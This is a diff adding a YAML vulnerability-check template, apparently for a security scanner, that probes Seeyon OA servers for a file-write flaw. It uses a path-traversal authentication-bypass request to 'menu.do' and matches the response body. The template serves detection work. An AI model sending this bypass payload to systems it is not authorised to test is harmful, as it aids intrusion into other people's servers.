@@ -1,0 +1,19 @@
+id: poc-yaml-seeyon-menu-do-file-write
+info:
+  name: Seeyon Menu.do 文件写入漏洞
+  severity: high
+  finger: Seeyon
+  tags:
+  - 文件写入
+  osprey-id: vb_2021_0001
+requests:
+- method: POST
+  path: /seeyon/autoinstall.do.css/..;/privilege/menu.do?method=showVersion
+  headers: {}
+  data: null
+  expression: 'contains(body, "<label for=\"radio1\" class=\"margin_t_5 hand display_block\">")
+    && contains(body, "seeyon")
+
+    '
+variables: {}
+transport: http
